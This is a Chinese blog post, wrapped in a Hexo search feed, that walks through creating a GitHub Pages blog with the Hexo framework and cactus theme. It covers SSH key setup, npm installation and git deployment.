        <content type="html"><![CDATA[<p>背景：因为最近打算开始弄个博客用于记录生活和学习&amp;研究内容的平台，博客无疑是一个很好的记录方式，由于以前用服务器搭建有服务端后台功能的博客发现不够安全且需要为服务器付费，所以现在就有了使用GitHub的存储库page来静态访问博客（足够安全和无后台服务端、无需为服务器续费，誒~ 解决方案安排的妥妥哒）的想法，在hexo博客框架下使用cactus主题的博客搭建，存放到GitHub仓库可省去服务器的费用 白嫖快乐！</p><h2 id="新建GitHub仓库"><a href="#新建GitHub仓库" class="headerlink" title="新建GitHub仓库"></a>新建GitHub仓库</h2><img src="https://s2.loli.net/2023/03/07/6OyMsXql3t4k8PK.png" alt="image-20230307005340246.png" style="float:left;" /><br><img src="https://s2.loli.net/2023/03/07/ojfb3n7aYLmxdFr.png" alt="image-20230307005520483.png" style="float:left;" /><h2 id="生成SSH密钥"><a href="#生成SSH密钥" class="headerlink" title="生成SSH密钥"></a>生成SSH密钥</h2><p>本地生成ssh公钥命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;GitHub邮箱&quot;</span></span><br><span class="line">按下回车三次即可生成在C:\Users\xxxx\.ssh目录下</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2023/03/07/FYitZ92zcQbmRAh.png" alt="image-20230307005939890.png" style="float:left" />打开id_rsa.pub文件即可看到生成出来的公钥<img src="https://s2.loli.net/2023/03/07/f1HUvhpN4LDgtIl.png" alt="image-20230307010126008.png" style="float:left" />GitHub绑定公钥<img src="https://s2.loli.net/2023/03/07/Hsmht3VYokTfCS8.png" alt="image-20230307010333153.png" style="float:left" />测试公钥是否绑定GitHub命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>看到以下提示即成功绑定<img src="https://s2.loli.net/2023/03/07/fp15dB6SRwtaD4N.png" alt="image-20230307010619173.png" style="float:left" /><h2 id="安装hexo框架并生成博客内容"><a href="#安装hexo框架并生成博客内容" class="headerlink" title="安装hexo框架并生成博客内容"></a>安装hexo框架并生成博客内容</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g //安装</span><br><span class="line">hexo init blog//自定义博客</span><br><span class="line"><span class="built_in">cd</span> blog</span><br><span class="line">npm install//安装项目所需要的全部包</span><br><span class="line">hexo server//启动hexo</span><br></pre></td></tr></table></figure><h2 id="提交hexo博客文件到GitHub仓库"><a href="#提交hexo博客文件到GitHub仓库" class="headerlink" title="提交hexo博客文件到GitHub仓库"></a>提交hexo博客文件到GitHub仓库</h2><p>修改本地配置文件为以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">type: git</span><br><span class="line">respository: 仓库地址</span><br><span class="line">branch:main</span><br></pre></td></tr></table></figure><p>respository为仓库项目 </p><img src="https://s2.loli.net/2023/03/07/fyeqFdVHJ83jaLQ.png" alt="image-20230307011831622.png" /><img src="https://s2.loli.net/2023/03/07/KgI3VFMmXGNiW6r.png" alt="image-20230307011429858.png" /><p>安装hexo提交工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>提交当前目录文件夹的所有文件的到仓库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g //生成博客页面</span><br><span class="line">hexo d//提交到GitHub仓库</span><br></pre></td></tr></table></figure><p>提交的过程中需要验证GitHub的token（默认自动弹窗确认账号密码 &#x2F; 直接授权给web验证），提交完成后再刷新下自己的仓库就可以看到本地的项目就已经提交上来了<br><img src="https://s2.loli.net/2023/03/07/j1vwXJmNUAxaieq.png" alt="image-20230307012212388.png" style="float:left" /></p><p>我们访问以下提交上来的博客地址：xxxx.github.io<br><img src="https://s2.loli.net/2023/03/07/VyEdrDobqJWnk1j.png" alt="image-20230307012531949.png" style="float:left" /><br>后期再进行优化，就先这样 下课！</p>]]></content>
      
      
      <categories>
          
          <category> blog杂记 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
